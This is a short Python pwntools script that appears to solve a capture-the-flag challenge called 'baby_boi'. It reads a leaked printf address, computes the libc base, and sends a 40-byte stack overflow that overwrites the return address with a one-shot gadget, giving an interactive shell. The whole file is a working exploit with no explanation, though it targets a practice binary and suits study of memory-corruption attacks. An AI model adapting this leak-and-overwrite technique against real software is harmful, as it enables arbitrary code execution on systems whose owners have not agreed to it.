from pwn import *

target = process('./baby_boi')
# libc = ELF('libc-2.27.so')
libc = ELF("/usr/lib/libc.so.6")

# target.recvuntil("I am: ")
print (target.recvuntil("Here I am: "))

leak = target.recvline()
print(leak)
leak = leak.strip(b"\n")

base = int(leak, 16) - libc.symbols['printf']   # base address of libc-2.27.so shared object linked during execution of baby_boi
print ("libc base: " + hex(base))
print ("printf offset in libc: " + hex(libc.symbols['printf']))

oneshot_gadget = base + 0x10366f

payload = 40 * b'0'
payload += p64(oneshot_gadget)

target.send(payload)
target.interactive()
